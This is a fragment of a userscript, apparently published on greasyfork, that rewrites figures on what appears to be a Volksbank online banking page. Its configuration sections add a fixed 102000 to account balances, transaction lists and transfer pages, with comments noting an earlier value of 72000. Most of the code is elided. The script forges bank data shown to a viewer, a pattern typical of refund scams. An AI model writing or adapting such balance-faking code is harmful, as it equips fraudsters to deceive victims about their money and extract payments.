// ==UserScript==
// @name         Ed 4Rec  vb.hmd-lehrberg@t-online.de
...
// @downloadURL https://update.greasyfork.org/scripts/543960/Ed%204Rec%20%20vbhmd-lehrberg%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/543960/Ed%204Rec%20%20vbhmd-lehrberg%40t-onlinede.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  102000},  // 72000
        { index: 1, adjustmentAmount:  102000},  // 72000
        { index: 2, adjustmentAmount:  102000},  // 72000
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    const modificationAmount = 102000; // Adjust the amount as needed  // 72000
